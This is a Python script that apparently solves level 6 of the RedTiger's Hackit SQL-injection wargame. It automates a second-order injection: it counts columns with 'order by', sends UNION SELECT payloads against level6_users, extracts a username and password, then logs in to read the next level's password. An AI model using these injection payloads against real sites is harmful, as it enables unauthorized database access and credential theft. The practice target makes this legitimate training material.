#!/usr/bin/env python3
import tigers as tg
import tiger_cookies


def str_to_hex(s: str) -> str:
    return '0x' + (s.encode('utf-8')).hex()


def main():
    '''
    Secondary SQL injection

    Target: Get the first user in table level6_users with status 1
    '''
    url = "https://redtiger.labs.overthewire.org/level6.php"
    table_name = 'level6_users'
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level6login'
    method = 'get'
    inj_param = 'user'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level6login=cooks[level])

    # Counting the number of columns
    # p = f"' union select username,username,password,password,password from {table_name} where status=1 #"
    # h = str_to_hex(p)
    # print(h)

    # Counting the number of columns
    payload = '1 order by %s'
    p = tg.SqlInjection(url, cook, method, inj_param, payload, check_clear=pass_r)
    if not (columns := p.count_columns_order_by()):
        return False

    # Search for visible columns and desired data
    ''' 
    payload = f"0 union select %s from {table_name} where status=1#"
    data = dict(user=payload)
    if not (keys := tg.find_visible_columns_and_param(url, columns, data, finds,
            cook, type_sqli=2, internal_payload=f"' union select %s from {table_name} where status=1#")):
        return False
    '''

    # Search for visible columns
    p.payload = f"0 union select %s from {table_name} where status=1#"
    p.internal_payload = f"' union select %s from {table_name} where status=1#"
    resp, visible = p.find_visible_columns(columns)
    if not visible:
        return False

    # Search for desired data
    if not (keys := p.find_param(finds, resp, columns)):
        return False

    print(keys)
    # Authorization
    other_param = {'user': keys[0], 'password': keys[1], 'login': 'Login'}
    p.inj_param = ''
    p.other_param = other_param
    p.method = 'post'
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
